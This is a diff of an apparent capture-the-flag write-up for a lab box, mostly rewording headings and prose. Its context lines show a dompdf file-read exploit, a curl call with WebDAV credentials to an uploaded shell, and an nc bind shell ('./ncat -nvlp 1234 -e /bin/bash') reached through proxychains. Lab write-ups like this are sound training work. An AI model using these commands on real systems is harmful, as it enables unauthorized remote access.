@@ -149,7 +149,7 @@ Looking back at our notes we search a little deeping in regards to dompdf. Seacr
 
 ![image](searchsploit.png)
 
-## Exploitation: Arbitrary File Read
+## Exploitation Arbitrary File Read
 
 ### POC 
 
@@ -169,7 +169,7 @@ We decode the string with the following base64 command and confirm the reading o
 
 ![image](passwd-output.png)
 
-## Enumeration Of The Target
+## Searching for information on the target
 
 There was a lot of searching to be done on this box, but when we start checking web server configuration files, we come across an interseting find. 
 
@@ -238,11 +238,7 @@ curl -u webdav_tester:babygurl69 'http://10.129.1.104/webdav_test_inception/shel
 
 ![image](confirm-execution.png)
 
-## Target Enumeration
-
-After a lot of trying, we are unable to get a reverse shell back to our Kali machine. We are unable to get any kind of connection backk to kali.
-
-## Automate our Remote Code Execution With Python
+## Automate our Remote Code Execution Exploit With Python
 
 The following python script runs commands on the target with the curl command used preveously. It uses hURL to url encode the commands. The while loops gives us a feeling of a shell and lets us send commands a little faster.
 
@@ -269,11 +265,11 @@ while True:
 
 ## Shell As www-data
 
-With our python script we can search a lot of files. We can also run linpea.sh from it, to speed up the process. 
+With our python script we can search the file system. We can also run linpea.sh from it if we wanted. 
 
-### Uploading NC to the target ANd Getting A reverse Shell
+### Uploading NetCat to the target and getting a shell
 
-Using the webdave exploit we can upload the nc version on Kali. First we copy the nc binary to our current directory.
+Using the webdave exploit we can upload the nc binary from Kali. First we copy the nc binary to our current directory.
 
 ```
 cp /usr/bin/nc .
@@ -289,14 +285,14 @@ Confirm the nc file with out python script.
 
 ![image](ncat-upload.png)
 
-First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on port 1234. With our python script, we run the following command on the target.
+First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on the target system, on port 1234. With our python script, we run the following command on the target.
 
 ```
 chmod 777 ncat
 ./ncat -nvlp 1234 -e /bin/bash
 ```
 
-From our Kali machine, we use proxychains and connect to the listener on port 1234.
+From our Kali machine, we use proxychains and connect to the listener on port 1234. We know we can connect to open ports though proxychains as we proved earlier when accessing port 22.
 
 ```
 proxychains nc -nv 127.0.0.1 1234
